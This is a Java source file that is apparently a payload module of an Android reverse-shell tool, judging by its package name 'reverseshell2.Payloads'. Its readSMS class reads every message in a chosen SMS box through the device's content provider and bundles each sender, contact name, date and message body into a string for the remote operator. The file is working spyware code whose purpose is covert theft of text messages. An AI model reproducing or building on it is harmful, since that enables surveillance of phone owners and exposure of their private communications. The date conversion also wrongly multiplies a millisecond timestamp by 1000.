package com.example.reverseshell2.Payloads;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import java.util.Date;

public class readSMS {
    Context context;

    public readSMS(Context context){
        this.context = context;
    }


    public String readSMSBox(String box) {
        Uri SMSURI = Uri.parse("content://sms/"+box);
        Cursor cur = context.getContentResolver().query(SMSURI, null, null, null,null);
        String sms = "";
        try {
            if (cur.moveToFirst()) {
                for (int i = 0; i < cur.getCount(); ++i) {
                    String iterator = String.valueOf(i);
                    String number = cur.getString(cur.getColumnIndexOrThrow("address"));
                    String date = cur.getString(cur.getColumnIndexOrThrow("date"));
                    String person = cur.getString(cur.getColumnIndexOrThrow("person"));
                    Long epoch = Long.parseLong(date);
                    Date fDate = new Date(epoch * 1000);
                    date = fDate.toString();
                    String body = cur.getString(cur.getColumnIndexOrThrow("body"));
                    String fi = "#"+iterator+"\n"+"Number : "+number+"\n"+"Person : "+person+"\n"+"Date : "+fDate+"\n"+"Body : "+body+"\n";
                    sms+=fi+"\n";
                    //sms += "[" + number + ":" + date + "]" + body + "\n";
                    cur.moveToNext();
                }
                sms += "\n";
            }
        } catch(NullPointerException npe) {
            return "";
        }
        return sms;
    }

}
